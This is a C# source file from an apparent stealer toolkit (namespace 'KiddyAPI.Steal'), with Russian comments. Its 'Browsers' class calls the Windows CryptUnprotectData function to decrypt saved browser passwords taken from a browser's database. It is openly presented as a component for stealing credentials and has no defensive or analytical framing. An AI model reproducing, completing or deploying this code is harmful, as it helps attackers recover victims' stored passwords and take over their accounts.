using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace KiddyAPI.Steal
{
    /// <summary>
    /// В классе реализована только расшифровка паролей
    /// </summary>
    public class Browsers
    {
        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        //github.com/1m50rry
        private static extern bool CryptUnprotectData(ref Browsers.DataBlob pCipherText, ref string pszDescription, ref Browsers.DataBlob pEntropy, IntPtr pReserved, ref Browsers.CryptprotectPromptstruct pPrompt, int dwFlags, ref Browsers.DataBlob pPlainText);
        /// <summary>
        /// Расшифровка паролей
        /// </summary>
        /// <param name="cipherTextBytes">Пароль, полученный из БД</param>
        /// <param name="entropyBytes">Энтропия(null)</param>
        /// <returns>Возвращает массив байтов </returns>
        public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
        {
            // Тут создаем BLOB'ы
            DataBlob pPlainText = new Browsers.DataBlob();
            DataBlob pCipherText = new Browsers.DataBlob();
            DataBlob pEntropy = new Browsers.DataBlob();
            // Создание структуры
            Browsers.CryptprotectPromptstruct pPrompt = new CryptprotectPromptstruct()
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)), // Размер в размере нашей структуры (Kappa)
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero, //Дескриптор
                szPrompt = (string)null
            };
            string empty = string.Empty;
            try
            {
                try
                {
                    if (cipherTextBytes == null)
                        cipherTextBytes = new byte[0];
                    pCipherText.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length); //Выделяем память в размере длинны пароля
                    pCipherText.cbData = cipherTextBytes.Length;
                    Marshal.Copy(cipherTextBytes, 0, pCipherText.pbData, cipherTextBytes.Length); // Копируем в неуп.память
                }
                catch (Exception ex)
                {
                }
                try
                {
                    if (entropyBytes == null)
                        entropyBytes = new byte[0];
                    pEntropy.pbData = Marshal.AllocHGlobal(entropyBytes.Length); // Выделяем память размера энтропии
                    pEntropy.cbData = entropyBytes.Length;
                    Marshal.Copy(entropyBytes, 0, pEntropy.pbData, entropyBytes.Length); // Копирауем в неуправляемою память
                }
                catch (Exception ex)
                {
                }
                Browsers.CryptUnprotectData(ref pCipherText, ref empty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText); // Собсна, декрипт
                byte[] destination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);// А это уже копируем из неупр.памяти
                return destination;
            }
            catch (Exception ex)
            {
            }
            finally
            //Тут освобождаем память, которую заняли, даже если произошла ошибка
            {
                if (pPlainText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pPlainText.pbData);
                if (pCipherText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pCipherText.pbData);
                if (pEntropy.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pEntropy.pbData);
            }
            return new byte[0];
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DataBlob // Блоб - большой массив двоичных данных
        {
            public int cbData;
            public IntPtr pbData;
        }
    }
}
